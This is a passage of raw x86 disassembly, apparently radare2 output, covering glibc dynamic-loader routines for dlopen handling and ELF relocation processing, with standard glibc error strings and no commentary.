mov edi, dword [var_24h]
and eax, 0xfffffff0
sub esp, eax
lea esi, [var_38h]
mov dword [var_ch], 0
mov dword [var_4h], ebx
mov dword [var_sp_8h], esi
mov dword [esp], edi
call fcn.0807af60
cmp byte [var_38h], 0
je 0x805529d
mov ebx, esi
jmp 0x8054c8e
mov dword [esp], str.empty_dynamic_string_token_substitution
xor ecx, ecx
mov edx, str.dlopen
xor eax, eax
jmp 0x8054f64
xor edx, edx
jmp 0x8055253
mov dword [var_ch], str.dl_open_worker
mov dword [var_sp_8h], 0xd3
mov dword [var_4h], str.dl_open.c
mov dword [esp], str._call_map___l_name_0___0
jmp 0x8054f88
xor edx, edx
cmp eax, 0xffffffff
je 0x8055253
mov dword [esp], eax
call fcn.08053400
jmp 0x8055251
mov dword [var_24h], eax
jmp 0x80551fc
mov dword [var_24h], esi
jmp 0x80551f1
mov dword [esp], str.DST_not_allowed_in_SUID_SGID_programs
jmp 0x80552a4
mov dword [var_sp_8h], 5
mov dword [var_4h], str.TLS_generation_counter_wrapped___Please_send_report_with_the_glibcbug_script.
mov dword [esp], str.libc
call fcn.0805f1f0
mov dword [esp], eax
call fcn.0804b4c0
nop
push ebp
mov ebp, esp
push edi
push esi
lea eax, [arg_8h]
push ebx
sub esp, 0xdc
mov esi, dword [arg_8h]
mov dword [var_68h], 0
mov dword [var_14h], eax
test byte [esi + 0x174], 4
jne 0x807f1e5
mov eax, dword [arg_14h]
test eax, eax
jne 0x807ede1
mov eax, dword [esi + 0x78]
mov edx, 0
test eax, eax
cmove edx, dword [var_10h_2]
mov dword [var_10h_2], edx
test byte [0x80aac10], 0x20
jne 0x8080066
mov eax, dword [esi + 0x70]
test eax, eax
jne 0x807ffa9
mov eax, dword [esi + 0x2c]
mov eax, dword [eax + 4]
mov dword [var_10h], eax
mov eax, dword [esi + 0x74]
test eax, eax
je 0x807ee43
mov eax, dword [var_10h_2]
test eax, eax
je 0x807ee43
mov eax, dword [esi + 0x24]
mov edx, dword [eax + 4]
mov eax, dword [edx + 4]
test eax, eax
je 0x807ee2e
add eax, dword [esi]
mov dword [esi + 0x1f8], eax
lea eax, [edx + 0xc]
mov dword [esi + 0x1fc], eax
mov dword [edx + 4], esi
mov edi, dword [var_14h_2]
test edi, edi
jne 0x807ff84
mov dword [edx + 8], 0x8081190
mov eax, dword [esi + 0x5c]
mov dword [var_2ch], 0
mov dword [var_24h], 0
mov dword [var_30h], 0
mov dword [var_34h], 0
test eax, eax
je 0x807ee75
mov eax, dword [eax + 4]
mov dword [var_34h_2], eax
mov eax, dword [esi + 0x60]
mov eax, dword [eax + 4]
mov dword [var_30h_2], eax
mov eax, dword [esi + 0x68]
test eax, eax
je 0x807ee86
cmp dword [eax + 4], 0x11
je 0x807ff46
mov dword [var_6ch], 0
mov edi, dword [var_6ch]
mov ecx, dword [esi]
mov dword [var_70h], esi
lea eax, [edi + edi*2]
mov dword [var_7ch], ecx
lea eax, [ebp + eax*4 - 0xc]
lea edx, [eax - 0x28]
mov ebx, dword [eax - 0x28]
mov eax, dword [edx + 4]
mov edx, dword [edx + 8]
mov edi, ebx
mov dword [var_74h], eax
add eax, ebx
test edx, edx
mov dword [var_78h], eax
je 0x807f875
cmp ebx, eax
jae 0x807eef0
movzx edx, byte [edi + 4]
mov ecx, dword [var_7ch_2]
add ecx, dword [edi]
cmp edx, 7
jne 0x807f869
mov edx, dword [esi + 0x1f8]
test edx, edx
jne 0x807f857
mov ebx, dword [var_7ch_2]
add dword [ecx], ebx
add edi, 8
cmp edi, dword [var_78h_2]
jb 0x807eec1
mov esi, esi
inc dword [var_6ch]
cmp dword [var_6ch], 1
jle 0x807ee8d
mov eax, dword [esi + 0x34]
mov dword [var_4ch], 0
mov dword [var_44h], 0
mov dword [var_50h], 0
mov dword [var_54h], 0
test eax, eax
je 0x807ef2b
mov eax, dword [eax + 4]
mov dword [var_54h], eax
mov eax, dword [esi + 0x38]
mov eax, dword [eax + 4]
mov dword [var_50h], eax
mov eax, dword [esi + 0x68]
test eax, eax
je 0x807ef3c
cmp dword [eax + 4], 7
je 0x807f819
mov dword [var_a4h], 0
mov ecx, dword [var_a4h]
mov dword [var_a8h], esi
lea eax, [ecx + ecx*2]
lea eax, [ebp + eax*4 - 0xc]
mov edx, dword [eax - 0x48]
mov edi, dword [eax - 0x44]
mov eax, dword [esi]
lea ebx, [edi + edx]
mov dword [var_b4h], eax
mov dword [var_b0h], ebx
mov eax, dword [esi + 0x30]
xor ebx, ebx
mov eax, dword [eax + 4]
mov dword [var_b8h], eax
mov eax, dword [esi + 0xb8]
test eax, eax
je 0x807ef8b
mov ebx, dword [eax + 4]
mov ecx, edx
mov eax, edi
mov edx, 0xaaaaaaab
mul edx
shr edx, 3
cmp edx, ebx
cmova edx, ebx
cmp esi, 0
lea edx, [edx + edx*2]
lea edx, [ecx + edx*4]
mov dword [var_ach], edx
je 0x807efee
mov ebx, dword [var_b4h]
test ebx, ebx
jne 0x807efc6
mov edx, dword [esi + 0x114]
test edx, edx
jne 0x807efee
cmp ecx, dword [var_ach]
jae 0x807efee
mov esi, esi
mov edx, dword [var_b4h]
mov eax, dword [var_b4h]
add edx, dword [ecx]
add eax, dword [ecx + 8]
add ecx, 0xc
cmp ecx, dword [var_ach]
mov dword [edx], eax
jb 0x807efd0
mov eax, dword [esi + 0xdc]
test eax, eax
je 0x807f4bc
mov edx, dword [var_b0h]
mov eax, dword [eax + 4]
cmp dword [var_ach], edx
mov dword [var_bch], eax
jae 0x807f1b0
mov ecx, dword [var_ach]
mov edi, dword [var_bch]
mov ebx, dword [ecx + 4]
mov ecx, dword [var_b8h]
mov eax, ebx
shr eax, 8
movzx edx, word [edi + eax*2]
mov edi, dword [var_ach]
shl eax, 4
add ecx, eax
mov eax, dword [var_a8h]
mov dword [var_60h], ecx
and dx, 0x7fff
movzx edx, dx
shl edx, 4
add edx, dword [eax + 0x17c]
mov eax, dword [var_b4h]
add eax, dword [edi]
movzx edi, bl
cmp edi, 8
mov dword [var_c0h], eax
je 0x807f49e
test edi, edi
je 0x807f190
mov dword [var_c4h], ecx
movzx eax, byte [ecx + 0xc]
mov dword [var_c8h], esi
shr al, 4
test al, al
je 0x807f156
cmp ecx, dword [esi + 0x200]
je 0x807f44a
xor eax, eax
cmp edi, 7
je 0x807f440
cmp edi, 0x23
je 0x807f440
cmp edi, 0x24
je 0x807f440
cmp edi, 0x25
je 0x807f440
cmp edi, 0xe
je 0x807f440
mov ecx, eax
mov ebx, 1
or eax, 2
cmp edi, 5
cmove ecx, eax
mov eax, dword [var_c4h]
mov dword [esi + 0x204], ecx
mov dword [esi + 0x200], eax
xor esi, esi
test edx, edx
je 0x807f105
mov eax, dword [edx + 4]
test eax, eax
je 0x807f105
mov esi, edx
xor ebx, ebx
mov eax, dword [var_60h]
mov edx, dword [arg_ch]
mov eax, dword [eax]
mov dword [esp], edx
mov dword [var_4h], esi
add eax, dword [var_10h]
mov edx, dword [arg_8h]
mov dword [var_8h], ecx
lea ecx, [var_60h]
mov dword [var_sp_ch], ebx
mov dword [var_sp_10h], 0
call fcn.0807e450
mov ecx, dword [var_60h]
mov edx, dword [arg_8h]
sub esp, 0x14
mov dword [var_c8h], eax
mov dword [edx + 0x20c], ecx
mov dword [edx + 0x208], eax
mov edx, dword [var_ach]
mov ebx, dword [edx + 4]
xor esi, esi
test ecx, ecx
je 0x807f167
mov eax, dword [var_c8h]
mov esi, dword [ecx + 4]
add esi, dword [eax]
movzx eax, bl
cmp eax, 0x25
ja case.0x807f173.0
jmp dword [eax*4 + 0x80a41a0]
mov edx, dword [var_ach]
mov ecx, dword [var_c0h]
add esi, dword [edx + 8]
mov dword [ecx], esi
mov esi, dword [arg_8h]
mov esi, esi
add dword [var_ach], 0xc
mov eax, dword [var_b0h]
cmp dword [var_ach], eax
jb 0x807f017
lea esi, [esi]
inc dword [var_a4h]
cmp dword [var_a4h], 1
jle 0x807ef46
mov eax, dword [arg_14h]
test eax, eax
jne 0x807f23e
or byte [esi + 0x174], 4
mov ecx, dword [var_68h]
test ecx, ecx
jne 0x807f1f4
mov eax, dword [arg_8h]
mov edx, dword [eax + 0x230]
test edx, edx
jne 0x807f1ed
lea esp, [var_ch]
pop ebx
pop esi
pop edi
leave
ret
call 0x80800d0
jmp 0x807f1e5
mov edx, dword [var_68h]
mov eax, dword [edx + 8]
mov dword [var_8h], eax
mov eax, dword [edx + 4]
mov dword [var_4h], eax
mov eax, dword [edx]
mov dword [esp], eax
call fcn.080547a0
test eax, eax
js 0x807f222
mov ecx, dword [var_68h]
mov ecx, dword [ecx + 0xc]
test ecx, ecx
mov dword [var_68h], ecx
je 0x807f1d8
jmp 0x807f1f4
mov ebx, str.cannot_restore_segment_prot_after_reloc
call fcn.08048b20
xor ecx, ecx
mov edx, dword [arg_8h]
mov edx, dword [edx + 4]
mov dword [esp], ebx
mov eax, dword [eax]
call fcn.08081200
mov edi, dword [esi + 0x20]
test edi, edi
je 0x807f2af
mov eax, dword [esi + 0x20]
mov eax, dword [eax + 4]
mov dword [esp], 4
mov dword [var_4h], eax
call fcn.08051730
mov dword [esi + 0x188], eax
mov esi, dword [arg_8h]
mov ebx, dword [esi + 0x188]
test ebx, ebx
jne 0x807f1ca
mov ebx, str._s:_profiler_out_of_memory_shadowing_PLTREL_of__s_n
mov eax, dword [0x80a95a8]
mov edx, str._program_name_unknown_
mov eax, dword [eax]
test eax, eax
cmovne edx, eax
mov eax, dword [esi + 4]
mov dword [esp], 2
mov dword [var_8h], edx
mov dword [var_4h], ebx
mov dword [var_sp_ch], eax
call fcn.08081ca0
mov dword [esp], 0x7f
call fcn.08053d90
mov ebx, str._s:_profiler_found_no_PLTREL_in_object__s_n
jmp 0x807f277
mov ebx, dword [var_ach]
mov edi, dword [var_c0h]
add esi, dword [ebx + 8]
sub esi, dword [var_c0h]
mov dword [edi], esi
jmp 0x807f18b
test ecx, ecx
je 0x807f18b
mov ebx, dword [var_c4h]
mov edx, dword [ebx + 8]
cmp dword [ecx + 8], edx
ja 0x807f316
jb 0x807f30d
mov eax, dword [ecx + 8]
mov edi, dword [var_c0h]
mov dword [var_4h], esi
cmp edx, eax
mov dword [esp], edi
cmovbe eax, edx
mov dword [var_8h], eax
call fcn.08053770
jmp 0x807f18b
mov eax, dword [0x80aac54]
test eax, eax
je 0x807f2ea
mov eax, dword [0x80a95a8]
mov edi, dword [var_a8h]
mov edx, str._program_name_unknown_
mov ebx, dword [var_c4h]
mov eax, dword [eax]
mov ecx, dword [edi + 0x2c]
test eax, eax
cmovne edx, eax
mov eax, dword [ebx]
add eax, dword [ecx + 4]
mov dword [var_8h], edx
mov dword [var_4h], str._s:_Symbol___s_has_different_size_in_shared_object__consider_re_linking_n
mov dword [esp], 2
mov dword [var_sp_ch], eax
call fcn.08081ca0
mov ecx, dword [var_60h]
mov edx, dword [ebx + 8]
jmp 0x807f2ea
test ecx, ecx
je 0x807f18b
mov ebx, dword [var_c8h]
mov edx, dword [ebx + 0x224]
test edx, edx
je 0x807f392
mov eax, dword [ecx + 4]
mov edi, dword [var_ach]
sub eax, edx
add eax, dword [edi + 8]
mov edx, dword [var_c0h]
mov dword [edx], eax
jmp 0x807f18b
mov eax, ebx
call fcn.0807ec80
mov ecx, dword [var_60h]
mov edx, dword [ebx + 0x224]
jmp 0x807f377
xor ecx, ecx
mov edx, edi
mov eax, dword [var_a8h]
mov esi, esi
call 0x8080140
mov eax, dword [var_c8h]
test eax, eax
je 0x807f18b
mov edx, dword [var_c8h]
mov ecx, dword [var_c0h]
mov eax, dword [edx + 0x228]
mov dword [ecx], eax
jmp 0x807f18b
test ecx, ecx
je 0x807f3ee
mov ebx, dword [var_ach]
mov eax, dword [ebx + 8]
add eax, dword [ecx + 4]
jmp 0x807f385
mov edi, dword [var_ach]
mov eax, dword [edi + 8]
jmp 0x807f385
test ecx, ecx
je 0x807f18b
mov ebx, dword [var_c8h]
mov edx, dword [ebx + 0x224]
test edx, edx
je 0x807f42a
mov edi, dword [var_ach]
sub edx, dword [ecx + 4]
mov eax, dword [var_c0h]
add edx, dword [edi + 8]
mov dword [eax], edx
jmp 0x807f18b
mov eax, ebx
call fcn.0807ec80
mov ecx, dword [var_60h]
mov edx, dword [ebx + 0x224]
jmp 0x807f411
lea esi, [esi]
mov eax, 1
jmp 0x807f0d2
xor ecx, ecx
cmp edi, 7
je 0x807f497
cmp edi, 0x23
je 0x807f497
cmp edi, 0x24
je 0x807f497
cmp edi, 0x25
je 0x807f497
cmp edi, 0xe
je 0x807f497
cmp edi, 5
mov eax, dword [esi + 0x204]
je 0x807f492
cmp ecx, eax
jne 0x807f0a3
mov ecx, dword [esi + 0x20c]
mov esi, dword [esi + 0x208]
mov dword [var_60h], ecx
mov dword [var_c8h], esi
jmp 0x807f156
or ecx, 2
jmp 0x807f470
mov ecx, 1
jmp 0x807f465
mov edx, dword [var_ach]
mov ecx, dword [var_a8h]
mov ebx, dword [var_c0h]
mov eax, dword [edx + 8]
add eax, dword [ecx]
mov dword [ebx], eax
jmp 0x807f190
mov edx, dword [var_b0h]
cmp dword [var_ach], edx
jae 0x807f1b0
mov esi, esi
mov ecx, dword [var_ach]
mov edi, dword [var_b4h]
mov edx, dword [var_b8h]
mov ebx, dword [ecx + 4]
add edi, dword [ecx]
mov eax, ebx
shr eax, 8
mov dword [var_cch], edi
movzx edi, bl
shl eax, 4
add edx, eax
cmp edi, 8
mov dword [var_64h], edx
je 0x807f801
test edi, edi
je 0x807f614
mov dword [var_d0h], edx
movzx eax, byte [edx + 0xc]
mov dword [var_d4h], esi
shr al, 4
test al, al
je 0x807f5dc
cmp edx, dword [esi + 0x200]
je 0x807f7ad
xor eax, eax
cmp edi, 7
je 0x807f7a3
cmp edi, 0x23
je 0x807f7a3
cmp edi, 0x24
je 0x807f7a3
cmp edi, 0x25
je 0x807f7a3
cmp edi, 0xe
je 0x807f7a3
mov edx, eax
mov ebx, dword [var_d0h]
lea ecx, [var_64h]
or edx, 2
cmp edi, 5
cmovne edx, eax
mov eax, dword [var_64h]
mov dword [esi + 0x204], edx
mov dword [esi + 0x200], ebx
mov eax, dword [eax]
mov dword [var_4h], 0
mov dword [var_8h], edx
mov edx, dword [arg_ch]
add eax, dword [var_10h]
mov dword [var_sp_10h], 0
mov dword [var_sp_ch], 1
mov dword [esp], edx
mov edx, dword [arg_8h]
call fcn.0807e450
mov ecx, dword [var_64h]
mov edx, dword [arg_8h]
mov dword [var_d4h], eax
sub esp, 0x14
mov dword [edx + 0x208], eax
mov dword [edx + 0x20c], ecx
mov eax, dword [var_ach]
mov edx, ecx
mov ebx, dword [eax + 4]
xor esi, esi
test edx, edx
je 0x807f5ed
mov ecx, dword [var_d4h]
mov esi, dword [edx + 4]
add esi, dword [ecx]
movzx eax, bl
cmp eax, 0x25
ja case.0x807f173.0
jmp dword [eax*4 + 0x80a4238]
mov ebx, dword [var_ach]
mov edi, dword [var_cch]
add esi, dword [ebx + 8]
mov dword [edi], esi
mov esi, dword [arg_8h]
add dword [var_ach], 0xc
mov eax, dword [var_b0h]
cmp dword [var_ach], eax
jb 0x807f4d0
jmp 0x807f1b0
mov eax, dword [var_ach]
mov edx, dword [var_cch]
add esi, dword [eax + 8]
sub esi, dword [var_cch]
mov dword [edx], esi
jmp 0x807f611
test edx, edx
je 0x807f611
mov ebx, dword [var_d0h]
mov ecx, dword [ebx + 8]
cmp dword [edx + 8], ecx
ja 0x807f688
jb 0x807f67f
mov eax, dword [edx + 8]
mov edi, dword [var_cch]
mov dword [var_4h], esi
cmp ecx, eax
mov dword [esp], edi
cmovbe eax, ecx
mov dword [var_8h], eax
call fcn.08053770
jmp 0x807f611
mov eax, dword [0x80aac54]
test eax, eax
je 0x807f65f
mov eax, dword [0x80a95a8]
mov edi, dword [var_a8h]
mov edx, str._program_name_unknown_
mov ebx, dword [var_d0h]
mov eax, dword [eax]
mov ecx, dword [edi + 0x2c]
test eax, eax
cmovne edx, eax
mov eax, dword [ebx]
add eax, dword [ecx + 4]
mov dword [var_8h], edx
mov dword [var_4h], str._s:_Symbol___s_has_different_size_in_shared_object__consider_re_linking_n
mov dword [esp], 2
mov dword [var_sp_ch], eax
call fcn.08081ca0
mov edx, dword [var_64h]
mov ecx, dword [ebx + 8]
jmp 0x807f65f
test edx, edx
je 0x807f611
mov ecx, dword [var_d4h]
mov ebx, dword [ecx + 0x224]
test ebx, ebx
je 0x807f704
mov eax, dword [edx + 4]
mov edx, dword [var_ach]
sub eax, ebx
add eax, dword [edx + 8]
mov ecx, dword [var_cch]
mov dword [ecx], eax
jmp 0x807f611
mov eax, ecx
call fcn.0807ec80
mov edi, dword [var_d4h]
mov edx, dword [var_64h]
mov ebx, dword [edi + 0x224]
jmp 0x807f6e9
mov eax, dword [var_d4h]
test eax, eax
je 0x807f611
mov ecx, dword [var_d4h]
mov ebx, dword [var_cch]
mov eax, dword [ecx + 0x228]
mov dword [ebx], eax
jmp 0x807f611
test edx, edx
je 0x807f755
mov edi, dword [var_ach]
mov eax, dword [edi + 8]
add eax, dword [edx + 4]
jmp 0x807f6f7
mov edx, dword [var_ach]
mov eax, dword [edx + 8]
jmp 0x807f6f7
test edx, edx
je 0x807f611
mov edi, dword [var_d4h]
mov ebx, dword [edi + 0x224]
test ebx, ebx
je 0x807f791
mov eax, dword [var_ach]
sub ebx, dword [edx + 4]
mov edx, dword [var_cch]
add ebx, dword [eax + 8]
mov dword [edx], ebx
jmp 0x807f611
mov eax, edi
call fcn.0807ec80
mov edx, dword [var_64h]
mov ebx, dword [edi + 0x224]
jmp 0x807f778
mov eax, 1
jmp 0x807f564
xor edx, edx
cmp edi, 7
je 0x807f7fa
cmp edi, 0x23
je 0x807f7fa
cmp edi, 0x24
je 0x807f7fa
cmp edi, 0x25
je 0x807f7fa
cmp edi, 0xe
je 0x807f7fa
cmp edi, 5
mov eax, dword [esi + 0x204]
je 0x807f7f5
cmp edx, eax
jne 0x807f535
mov edx, dword [esi + 0x20c]
mov esi, dword [esi + 0x208]
mov dword [var_64h], edx
mov dword [var_d4h], esi
jmp 0x807f5dc
or edx, 2
jmp 0x807f7d3
mov edx, 1
jmp 0x807f7c8
mov edx, dword [var_a8h]
mov eax, dword [ecx + 8]
mov ecx, dword [var_cch]
add eax, dword [edx]
mov dword [ecx], eax
jmp 0x807f614
mov edi, dword [arg_10h]
mov eax, dword [esi + 0x74]
test edi, edi
mov ecx, dword [eax + 4]
jne 0x807f832
mov edx, dword [var_50h]
mov eax, dword [var_54h]
add eax, edx
cmp eax, ecx
je 0x807f849
mov eax, dword [esi + 0x20]
mov dword [var_48h], ecx
mov edx, dword [arg_10h]
mov eax, dword [eax + 4]
mov dword [var_40h], edx
mov dword [var_44h], eax
jmp 0x807ef3c
mov eax, dword [esi + 0x20]
add edx, dword [eax + 4]
mov dword [var_50h], edx
jmp 0x807ef3c
mov eax, ecx
sub eax, dword [esi + 0x1fc]
lea eax, [edx + eax*4]
mov dword [ecx], eax
jmp 0x807eee6
mov ecx, 1
mov eax, esi
jmp 0x807f3b0
mov eax, dword [esi + 0x30]
xor ecx, ecx
mov eax, dword [eax + 4]
mov dword [var_80h], eax
mov eax, dword [esi + 0xb4]
test eax, eax
je 0x807f88d
mov ecx, dword [eax + 4]
mov eax, dword [var_74h]
mov edx, ebx
shr eax, 3
cmp eax, ecx
cmova eax, ecx
cmp esi, 0
lea edi, [ebx + eax*8]
je 0x807f8d0
mov eax, dword [var_7ch]
test eax, eax
je 0x807f8d0
cmp ebx, edi
jae 0x807f8d0
mov eax, dword [var_7ch]
add eax, dword [edx]
cmp byte [edx + 4], 8
jne 0x80800a3
add edx, 8
mov ecx, dword [var_7ch_2]
add dword [eax], ecx
cmp edx, edi
jb 0x807f8b0
nop
lea esi, [esi]
mov eax, dword [esi + 0xdc]
test eax, eax
je 0x807fc40
cmp edi, dword [var_78h]
mov eax, dword [eax + 4]
mov dword [var_84h], eax
jae 0x807eef0
mov eax, dword [edi + 4]
mov ebx, dword [var_84h]
mov edx, eax
shr edx, 8
movzx ecx, word [ebx + edx*2]
mov ebx, dword [var_70h]
shl edx, 4
add edx, dword [var_80h]
and cx, 0x7fff
movzx ecx, cx
mov dword [var_58h], edx
shl ecx, 4
add ecx, dword [ebx + 0x17c]
mov ebx, dword [var_7ch]
add ebx, dword [edi]
mov dword [var_88h], ebx
movzx ebx, al
cmp ebx, 8
je 0x807fc2a
test ebx, ebx
je 0x807fa53
mov dword [var_8ch], edx
movzx eax, byte [edx + 0xc]
mov dword [var_90h], esi
shr al, 4
test al, al
je 0x807fa23
cmp edx, dword [esi + 0x200]
je 0x807fbd6
xor eax, eax
cmp ebx, 7
je 0x807fbcc
cmp ebx, 0x23
je 0x807fbcc
cmp ebx, 0x24
je 0x807fbcc
cmp ebx, 0x25
je 0x807fbcc
cmp ebx, 0xe
je 0x807fbcc
mov edx, eax
mov dword [var_94h], 0
or eax, 2
cmp ebx, 5
cmove edx, eax
test ecx, ecx
mov eax, dword [var_8ch]
mov dword [esi + 0x204], edx
mov dword [esi + 0x200], eax
mov esi, 1
je 0x807f9d3
mov eax, dword [ecx + 4]
test eax, eax
je 0x807f9d3
mov dword [var_94h], ecx
xor esi, esi
mov eax, dword [var_58h]
lea ecx, [var_58h]
mov eax, dword [eax]
mov dword [var_8h], edx
mov dword [var_sp_ch], esi
mov edx, dword [var_94h]
add eax, dword [var_10h]
mov dword [var_sp_10h], 0
mov dword [var_4h], edx
mov edx, dword [arg_ch]
mov dword [esp], edx
mov edx, dword [arg_8h]
call fcn.0807e450
mov ecx, dword [var_58h]
mov edx, dword [arg_8h]
sub esp, 0x14
mov dword [var_90h], eax
mov dword [edx + 0x20c], ecx
mov dword [edx + 0x208], eax
mov edx, ecx
xor esi, esi
test edx, edx
je 0x807fa34
mov ecx, dword [var_90h]
mov esi, dword [edx + 4]
add esi, dword [ecx]
cmp ebx, 0x25
ja case.0x807fd5f.0
jmp dword [ebx*4 + 0x80a42d0]
mov ebx, dword [var_88h]
mov dword [ebx], esi
lea esi, [esi]
mov esi, dword [arg_8h]
add edi, 8
cmp edi, dword [var_78h]
jb 0x807f8f0
jmp 0x807eef0
mov ecx, dword [var_88h]
add dword [ecx], esi
jmp 0x807fa50
mov ebx, dword [var_88h]
sub esi, dword [var_88h]
add dword [ebx], esi
jmp 0x807fa50
test edx, edx
je 0x807fa50
mov eax, dword [var_8ch]
mov ecx, dword [eax + 8]
cmp dword [edx + 8], ecx
ja 0x807fabb
jb 0x807fab2
mov eax, dword [edx + 8]
mov dword [var_4h], esi
cmp ecx, eax
cmovbe eax, ecx
mov dword [var_8h], eax
mov eax, dword [var_88h]
mov dword [esp], eax
call fcn.08053770
jmp 0x807fa50
mov eax, dword [0x80aac54]
test eax, eax
je 0x807fa92
mov eax, dword [0x80a95a8]
mov edx, dword [var_70h]
mov ebx, dword [var_8ch]
mov eax, dword [eax]
mov ecx, dword [edx + 0x2c]
mov edx, str._program_name_unknown_
test eax, eax
cmovne edx, eax
mov eax, dword [ebx]
add eax, dword [ecx + 4]
mov dword [var_8h], edx
mov dword [var_4h], str._s:_Symbol___s_has_different_size_in_shared_object__consider_re_linking_n
mov dword [esp], 2
mov dword [var_sp_ch], eax
call fcn.08081ca0
mov edx, dword [var_58h]
mov ecx, dword [ebx + 8]
jmp 0x807fa92
test edx, edx
je 0x807fa50
mov ecx, dword [var_90h]
mov ebx, dword [ecx + 0x224]
test ebx, ebx
je 0x807fb2b
mov eax, dword [edx + 4]
mov edx, dword [var_88h]
sub eax, ebx
add dword [edx], eax
jmp 0x807fa50
mov eax, ecx
call fcn.0807ec80
mov eax, dword [var_90h]
mov edx, dword [var_58h]
mov ebx, dword [eax + 0x224]
jmp 0x807fb19
mov eax, dword [var_70h]
xor ecx, ecx
mov edx, ebx
jmp 0x807f3b0
mov eax, dword [var_90h]
test eax, eax
je 0x807fa50
mov edx, dword [var_90h]
mov ecx, dword [var_88h]
mov eax, dword [edx + 0x228]
mov dword [ecx], eax
jmp 0x807fa50
test edx, edx
je 0x807fa50
mov eax, dword [edx + 4]
mov ebx, dword [var_88h]
mov dword [ebx], eax
jmp 0x807fa50
test edx, edx
je 0x807fa50
mov eax, dword [var_90h]
mov ebx, dword [eax + 0x224]
test ebx, ebx
je 0x807fbb6
mov eax, dword [var_88h]
sub ebx, dword [edx + 4]
add dword [eax], ebx
jmp 0x807fa50
call fcn.0807ec80
mov ecx, dword [var_90h]
mov edx, dword [var_58h]
mov ebx, dword [ecx + 0x224]
jmp 0x807fba6
mov eax, 1
jmp 0x807f994
xor edx, edx
cmp ebx, 7
je 0x807fc23
cmp ebx, 0x23
je 0x807fc23
cmp ebx, 0x24
je 0x807fc23
cmp ebx, 0x25
je 0x807fc23
cmp ebx, 0xe
je 0x807fc23
cmp ebx, 5
mov eax, dword [esi + 0x204]
je 0x807fc1e
cmp edx, eax
jne 0x807f965
mov edx, dword [esi + 0x20c]
mov esi, dword [esi + 0x208]
mov dword [var_58h], edx
mov dword [var_90h], esi
jmp 0x807fa23
or edx, 2
jmp 0x807fbfc
mov edx, 1
jmp 0x807fbf1
mov edx, dword [var_70h]
mov ecx, dword [var_88h]
mov eax, dword [edx]
add dword [ecx], eax
jmp 0x807fa53
lea esi, [esi]
cmp edi, dword [var_78h]
jae 0x807eef0
lea esi, [esi]
mov edx, dword [edi + 4]
mov ebx, dword [var_7ch]
add ebx, dword [edi]
mov ecx, dword [var_80h]
mov eax, edx
shr eax, 8
shl eax, 4
mov dword [var_98h], ebx
movzx ebx, dl
add ecx, eax
cmp ebx, 8
mov dword [var_5ch], ecx
je 0x807ff34
test ebx, ebx
je 0x807fd73
mov dword [var_9ch], ecx
movzx eax, byte [ecx + 0xc]
mov dword [var_a0h], esi
shr al, 4
test al, al
je 0x807fd45
cmp ecx, dword [esi + 0x200]
je 0x807fee0
xor eax, eax
cmp ebx, 7
je 0x807fed6
cmp ebx, 0x23
je 0x807fed6
cmp ebx, 0x24
je 0x807fed6
cmp ebx, 0x25
je 0x807fed6
cmp ebx, 0xe
je 0x807fed6
mov edx, eax
lea ecx, [var_5ch]
or edx, 2
cmp ebx, 5
cmovne edx, eax
mov eax, dword [var_9ch]
mov dword [esi + 0x204], edx
mov dword [esi + 0x200], eax
mov eax, dword [var_5ch]
mov eax, dword [eax]
mov dword [var_4h], 0
mov dword [var_8h], edx
mov edx, dword [arg_ch]
add eax, dword [var_10h]
mov dword [var_sp_10h], 0
mov dword [var_sp_ch], 1
mov dword [esp], edx
mov edx, dword [arg_8h]
call fcn.0807e450
mov ecx, dword [var_5ch]
mov edx, dword [arg_8h]
sub esp, 0x14
mov dword [var_a0h], eax
mov dword [edx + 0x20c], ecx
mov dword [edx + 0x208], eax
xor esi, esi
test ecx, ecx
je 0x807fd56
mov edx, dword [var_a0h]
mov esi, dword [ecx + 4]
add esi, dword [edx]
cmp ebx, 0x25
ja case.0x807fd5f.0
jmp dword [ebx*4 + 0x80a4368]
mov ecx, dword [var_98h]
mov dword [ecx], esi
mov esi, esi
mov esi, dword [arg_8h]
add edi, 8
cmp edi, dword [var_78h]
jb 0x807fc50
jmp 0x807eef0
mov ecx, dword [var_98h]
add dword [ecx], esi
jmp 0x807fd70
mov ebx, dword [var_98h]
sub esi, dword [var_98h]
add dword [ebx], esi
jmp 0x807fd70
test ecx, ecx
je 0x807fd70
mov eax, dword [var_9ch]
mov edx, dword [eax + 8]
cmp dword [ecx + 8], edx
ja 0x807fddb
jb 0x807fdd2
mov eax, dword [ecx + 8]
mov dword [var_4h], esi
cmp edx, eax
cmovbe eax, edx
mov dword [var_8h], eax
mov eax, dword [var_98h]
mov dword [esp], eax
call fcn.08053770
jmp 0x807fd70
mov eax, dword [0x80aac54]
test eax, eax
je 0x807fdb2
mov eax, dword [0x80a95a8]
mov edx, dword [var_70h]
mov ebx, dword [var_9ch]
mov eax, dword [eax]
mov ecx, dword [edx + 0x2c]
mov edx, str._program_name_unknown_
test eax, eax
cmovne edx, eax
mov eax, dword [ebx]
add eax, dword [ecx + 4]
mov dword [var_8h], edx
mov dword [var_4h], str._s:_Symbol___s_has_different_size_in_shared_object__consider_re_linking_n
mov dword [esp], 2
mov dword [var_sp_ch], eax
call fcn.08081ca0
mov ecx, dword [var_5ch]
mov edx, dword [ebx + 8]
jmp 0x807fdb2
test ecx, ecx
je 0x807fd70
mov ebx, dword [var_a0h]
mov edx, dword [ebx + 0x224]
test edx, edx
je 0x807fe4b
mov eax, dword [ecx + 4]
sub eax, edx
mov edx, dword [var_98h]
add dword [edx], eax
jmp 0x807fd70
mov eax, ebx
call fcn.0807ec80
mov ecx, dword [var_5ch]
mov edx, dword [ebx + 0x224]
jmp 0x807fe39
mov eax, dword [var_a0h]
test eax, eax
je 0x807fd70
mov ebx, dword [var_a0h]
mov edx, dword [var_98h]
mov eax, dword [ebx + 0x228]
mov dword [edx], eax
jmp 0x807fd70
test ecx, ecx
je 0x807fd70
mov eax, dword [ecx + 4]
mov ecx, dword [var_98h]
mov dword [ecx], eax
jmp 0x807fd70
test ecx, ecx
je 0x807fd70
mov ebx, dword [var_a0h]
mov edx, dword [ebx + 0x224]
test edx, edx
je 0x807fec4
mov eax, dword [var_98h]
sub edx, dword [ecx + 4]
add dword [eax], edx
jmp 0x807fd70
mov eax, ebx
call fcn.0807ec80
mov ecx, dword [var_5ch]
mov edx, dword [ebx + 0x224]
jmp 0x807feb4
mov eax, 1
jmp 0x807fcd8
xor edx, edx
cmp ebx, 7
je 0x807ff2d
cmp ebx, 0x23
je 0x807ff2d
cmp ebx, 0x24
je 0x807ff2d
cmp ebx, 0x25
je 0x807ff2d
cmp ebx, 0xe
je 0x807ff2d
cmp ebx, 5
